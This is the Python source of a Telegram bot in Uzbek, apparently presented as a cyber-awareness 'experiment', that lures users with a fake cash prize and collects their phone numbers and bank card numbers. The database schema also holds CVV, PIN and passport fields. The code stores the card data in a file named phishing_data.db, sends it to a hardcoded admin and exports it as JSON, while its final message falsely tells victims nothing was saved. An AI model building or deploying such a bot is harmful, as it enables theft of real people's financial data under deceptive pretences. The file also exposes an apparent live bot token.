import telebot
from telebot import types
import random
import sqlite3
import threading
import time
import json
from datetime import datetime
import re
import traceback

TOKEN = "8878797713:AAEBYRAQ_M1RRrTsqNJ25HxIUqnqpDAJqzM"
ADMIN_ID = 8031548575
bot = telebot.TeleBot(TOKEN)

CHANNEL_URL = "https://t.me/samcyber_102"


def init_db():
    conn = sqlite3.connect('phishing_data.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER UNIQUE,
            phone TEXT,
            card_number TEXT,
            card_expiry TEXT,
            card_cvv TEXT,
            card_pin TEXT,
            mothers_name TEXT,
            passport_seria TEXT,
            birth_date TEXT,
            ip_address TEXT,
            device_info TEXT,
            step INTEGER DEFAULT 0,
            language TEXT DEFAULT 'uz',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            completed_at TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            code_type TEXT,
            attempts INTEGER DEFAULT 0,
            blocked INTEGER DEFAULT 0,
            FOREIGN KEY(chat_id) REFERENCES users(chat_id)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            action TEXT,
            detail TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(chat_id) REFERENCES users(chat_id)
        )
    ''')
    conn.commit()
    conn.close()


init_db()


def get_db():
    return sqlite3.connect('phishing_data.db', check_same_thread=False)


def log_action(chat_id, action, detail=""):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO logs (chat_id, action, detail) VALUES (?, ?, ?)", (chat_id, action, detail))
    conn.commit()
    conn.close()


user_steps = {}

TEXTS = {
    'welcome': (
        "Assalomu alaykum! Oʻyinda ishtirok etish va qimmatbaho sovgʻalar yutib olish "
        "imkoniyatiga ega boʻlish uchun telefon raqamingizni yozib yuboring.\n\n"
        "+998 avtomatik qoʻshiladi — faqat qolgan 9 raqamni yozing.\n"
        "Misol: 901234567"
    ),
    'phone_invalid': "❌ Notoʻgʻri raqam. 9 xonali raqam kiriting (masalan: 901234567).",
    'number_pick': "Oʻyinda ishtirok etish uchun 1 dan 9 gacha boʻlgan raqamlardan birini yozing:",
    'number_invalid': "❌ Faqat 1 dan 9 gacha bitta raqam yozing.",
    'prize_win': (
        "Tabriklaymiz! Siz tasodifiy tanlov natijasiga koʻra {} SOʻM pul yutugʻi "
        "egasiga aylandingiz! 🎉"
    ),
    'card_prompt': (
        "Yutuqni bankingiz plastik kartasiga darhol tushirib olish uchun 16 talik "
        "karta raqamingizni kiriting:"
    ),
    'card_invalid': "❌ Karta raqami notoʻgʻri. Faqat 16 xonali raqam kiriting.",
    'code_sent': "📩 Telefoningizga tasdiqlash kodi yuborildi.\n\n🔐 Kodni kiriting: {}",
    'code_invalid': "❌ Kod notoʻgʻri. Qaytadan kiriting.",
    'blocked': "🚫 Urinishlar tugadi. /start buyrugʻi bilan qayta boshlang.",
    'experiment': (
        "⚠️ BU EKSPERIMENT EDI! ⚠️\n\n"
        "❌ Siz hech narsa yutmadingiz!\n\n"
        "😱 Agar bu HAQIQIY firibgarlik boʻlganda:\n"
        "• Telefon raqamingiz oʻgʻirlangan boʻlardi\n"
        "• Bank hisobingizdan pul yechib olinardi\n"
        "• Shaxsiy maʻlumotlaringiz sotilgan boʻlardi\n\n"
        "🔐 ESDA TUTING:\n\n"
        "1️⃣ Tanishilmagan QR kodlarni skanerlamang!\n"
        "2️⃣ Telefon raqamingizni notanish saytlarga bermang!\n"
        "3️⃣ SMS kodlarni HECH KIMGA aytmang!\n"
        "4️⃣ \"Bepul sovgʻa\" vaʻdalariga ishonmang!\n\n"
        "📣 Bu tajriba kiberjinoyatlarning oldini olish va fuqarolarning raqamli "
        "savodxonligini oshirish uchun oʻtkazildi.\n\n"
        "✅ Endi siz bu hiylalarni bilasiz — yaqinlaringizni asrash uchun boshqalarga ham ayting!\n\n"
        "🔒 Xavotirga oʻrin yoʻq: siz kiritgan hech qanday maxfiy maʻlumotlar yoki bank "
        "maʻlumotlari tizimimizda saqlanmadi va uchinchi shaxslarga uzatilmadi."
    ),
    'channel_follow': (
        "Kanalimizda kiberxavfsizlikka oid eng muhim tavsiyalar va dolzarb ogohlantirishlar "
        "berib boriladi. Bilim va ogohlik — sizning eng ishonchli qalqoningizdir!"
    ),
}


def get_text(key):
    return TEXTS.get(key, '')


def format_sum(amount):
    return f"{amount:,}".replace(",", " ")


def normalize_phone(text):
    digits = re.sub(r'\D', '', text or '')
    if digits.startswith('998'):
        digits = digits[3:]
    if len(digits) == 9 and digits.isdigit():
        return '+998' + digits
    return None


def get_state(chat_id):
    if chat_id not in user_steps:
        user_steps[chat_id] = {'step': 'idle'}
    return user_steps[chat_id]


def set_step(chat_id, step):
    get_state(chat_id)['step'] = step


def get_step(chat_id):
    return get_state(chat_id).get('step', 'idle')


def safe_answer_callback(call, text=""):
    try:
        bot.answer_callback_query(call.id, text)
    except Exception:
        pass


def get_ip_info(chat_id):
    try:
        user = bot.get_chat(chat_id)
        return {
            'ip': f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}",
            'device': f"{user.first_name or ''} {user.last_name or ''} (@{user.username or 'unknown'})",
        }
    except Exception:
        return {'ip': 'unknown', 'device': 'unknown'}


def build_channel_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📢 Kiber Kanal", url=CHANNEL_URL),
        types.InlineKeyboardButton("📢 Samarqand Cyber", url="https://t.me/samiibuz"),
    )
    return markup


def send_code(chat_id, code_key, text_key):
    code = random.randint(1000, 9999)
    state = get_state(chat_id)
    state[code_key] = code
    state[f'{code_key}_attempts'] = 3
    bot.send_message(chat_id, get_text(text_key).format(code))


def finish_experiment(chat_id):
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "UPDATE users SET step = 10, completed_at = CURRENT_TIMESTAMP WHERE chat_id = ?",
        (chat_id,)
    )
    conn.commit()
    conn.close()

    set_step(chat_id, 'done')
    log_action(chat_id, "experiment_completed")
    notify_admin(chat_id)

    bot.send_message(chat_id, get_text('experiment'))
    bot.send_message(chat_id, get_text('channel_follow'), reply_markup=build_channel_menu())


def process_phone(chat_id, phone_raw):
    phone = normalize_phone(phone_raw)
    if not phone:
        bot.send_message(chat_id, get_text('phone_invalid'))
        return

    state = get_state(chat_id)
    state['phone'] = phone

    conn = get_db()
    c = conn.cursor()
    ip_info = get_ip_info(chat_id)
    c.execute('''
        INSERT OR REPLACE INTO users (chat_id, phone, ip_address, device_info, step, language)
        VALUES (?, ?, ?, ?, 1, 'uz')
    ''', (chat_id, phone, ip_info['ip'], ip_info['device']))
    conn.commit()
    conn.close()

    log_action(chat_id, "phone_received", phone)
    set_step(chat_id, 'number_pick')
    bot.send_message(chat_id, get_text('number_pick'))


def process_number_pick(chat_id, text):
    picked = (text or '').strip()
    if picked not in ('1', '2', '3', '4', '5', '6', '7', '8', '9'):
        bot.send_message(chat_id, get_text('number_invalid'))
        return

    state = get_state(chat_id)
    state['picked_number'] = picked

    prize = random.randint(50000, 1000000)
    prize = max(50000, (prize // 1000) * 1000)
    state['prize'] = prize

    bot.send_message(chat_id, get_text('prize_win').format(format_sum(prize)))
    log_action(chat_id, "number_picked", f"raqam={picked}, yutuq={prize}")

    set_step(chat_id, 'card')
    bot.send_message(chat_id, get_text('card_prompt'))


def process_card(chat_id, text):
    card_num = re.sub(r'\D', '', text or '')
    if len(card_num) != 16:
        bot.send_message(chat_id, get_text('card_invalid'))
        return

    state = get_state(chat_id)
    state['card'] = card_num

    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET card_number = ?, step = 2 WHERE chat_id = ?", (card_num, chat_id))
    conn.commit()
    conn.close()

    log_action(chat_id, "card_received", card_num)
    set_step(chat_id, 'code1')
    send_code(chat_id, 'code_1', 'code_sent')


def process_code(chat_id, text, code_key):
    state = get_state(chat_id)
    user_input = (text or '').strip()
    correct_code = str(state.get(code_key, ''))
    attempts = state.get(f'{code_key}_attempts', 3)

    if user_input == correct_code:
        log_action(chat_id, f"{code_key}_verified")
        finish_experiment(chat_id)
        return

    attempts -= 1
    state[f'{code_key}_attempts'] = attempts
    log_action(chat_id, f"{code_key}_failed", f"qolgan={attempts}")

    if attempts <= 0:
        set_step(chat_id, 'blocked')
        bot.send_message(chat_id, get_text('blocked'))
    else:
        bot.send_message(chat_id, get_text('code_invalid'))


# ============== /start ==============
@bot.message_handler(commands=['start'])
def start_handler(message):
    chat_id = message.chat.id
    user_steps[chat_id] = {'step': 'phone'}

    ip_info = get_ip_info(chat_id)
    log_action(chat_id, "bot_started", json.dumps(ip_info))

    bot.send_message(
        chat_id,
        get_text('welcome'),
        reply_markup=types.ReplyKeyboardRemove()
    )


# ============== ADMIN CALLBACK ==============
@bot.callback_query_handler(func=lambda call: call.data and call.data.startswith('admin_'))
def admin_callback_handler(call):
    handle_admin_callback(call)


# ============== XABARLAR (step bo'yicha) ==============
@bot.message_handler(func=lambda m: get_step(m.chat.id) == 'phone')
def phone_step_handler(message):
    process_phone(message.chat.id, message.text)


@bot.message_handler(func=lambda m: get_step(m.chat.id) == 'number_pick')
def number_pick_step_handler(message):
    process_number_pick(message.chat.id, message.text)


@bot.message_handler(func=lambda m: get_step(m.chat.id) == 'card')
def card_step_handler(message):
    process_card(message.chat.id, message.text)


@bot.message_handler(func=lambda m: get_step(m.chat.id) == 'code1')
def code1_step_handler(message):
    process_code(message.chat.id, message.text, 'code_1')


# ============== ADMIN ==============
def notify_admin(user_chat_id):
    try:
        data = user_steps.get(user_chat_id, {})
        admin_msg = (
            f"🆕 Yangi tajriba ishtirokchisi!\n\n"
            f"👤 Chat ID: {user_chat_id}\n"
            f"📱 Telefon: {data.get('phone', 'N/A')}\n"
            f"🎲 Tanlangan raqam: {data.get('picked_number', 'N/A')}\n"
            f"💰 Yutuq: {format_sum(data.get('prize', 0))} so'm\n"
            f"💳 Karta: {data.get('card', 'N/A')}\n"
            f"🔐 Kod: {data.get('code_1', 'N/A')}\n"
            f"🕐 Vaqt: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        bot.send_message(ADMIN_ID, admin_msg)
    except Exception as e:
        print(f"Admin notify error: {e}")


@bot.message_handler(commands=['admin'])
def admin_panel(message):
    chat_id = message.chat.id
    if chat_id != ADMIN_ID:
        bot.send_message(chat_id, "⛔ Bu buyruq faqat adminlar uchun!")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📋 Barcha ma'lumotlar", callback_data="admin_all"),
        types.InlineKeyboardButton("📊 Statistika", callback_data="admin_stats"),
        types.InlineKeyboardButton("📤 Eksport (JSON)", callback_data="admin_export"),
        types.InlineKeyboardButton("📜 Loglar", callback_data="admin_logs"),
    )
    bot.send_message(chat_id, "👑 Admin Panel\n\nBo'limni tanlang:", reply_markup=markup)


def handle_admin_callback(call):
    chat_id = call.message.chat.id
    if chat_id != ADMIN_ID:
        safe_answer_callback(call, "⛔ Ruxsat yo'q!")
        return

    action = call.data.split('_')[1]
    conn = get_db()
    c = conn.cursor()

    if action == 'all':
        c.execute("SELECT * FROM users WHERE completed_at IS NOT NULL ORDER BY completed_at DESC")
        users = c.fetchall()
        if not users:
            bot.send_message(chat_id, "📭 Hali ma'lumot yo'q.")
        else:
            for user in users[:10]:
                bot.send_message(
                    chat_id,
                    f"👤 #{user[0]}\n"
                    f"Chat ID: {user[1]}\n"
                    f"Telefon: {user[2]}\n"
                    f"Karta: {user[3]}\n"
                    f"Yakunlangan: {user[14]}"
                )

    elif action == 'stats':
        c.execute("SELECT COUNT(*) FROM users")
        total = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM users WHERE completed_at IS NOT NULL")
        completed = c.fetchone()[0]
        bot.send_message(
            chat_id,
            f"📊 Statistika\n\nJami: {total}\nTugatganlar: {completed}\nTugatmaganlar: {total - completed}"
        )

    elif action == 'export':
        c.execute("SELECT * FROM users WHERE completed_at IS NOT NULL")
        users = c.fetchall()
        export_data = [{
            'id': u[0], 'chat_id': u[1], 'phone': u[2],
            'card_number': u[3], 'completed_at': u[14]
        } for u in users]
        with open('export_data.json', 'w') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)
        with open('export_data.json', 'rb') as f:
            bot.send_document(chat_id, f)

    elif action == 'logs':
        c.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT 20")
        logs = c.fetchall()
        if not logs:
            bot.send_message(chat_id, "📭 Loglar yo'q.")
        else:
            log_text = "📜 So'nggi loglar:\n\n"
            for log in logs:
                log_text += f"• [{log[4]}] {log[2]}: {log[3]}\n"
            bot.send_message(chat_id, log_text[:4000])

    conn.close()
    safe_answer_callback(call, "✅ Bajarildi!")


# ============== FALLBACK ==============
@bot.callback_query_handler(func=lambda call: True)
def unknown_callback(call):
    safe_answer_callback(call, "⚠️ /start bosing")


@bot.message_handler(func=lambda message: True)
def fallback_handler(message):
    bot.send_message(message.chat.id, "Iltimos, /start buyrug'ini bosing.")


if __name__ == "__main__":
    print("=" * 50)
    print("Kiber-ogohlantirish boti ishga tushdi!")
    print(f"Admin ID: {ADMIN_ID}")
    print("=" * 50)

    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Xatolik: {e}")
            traceback.print_exc()
            print("Qayta ulanish 5 soniyadan keyin...")
            time.sleep(5)
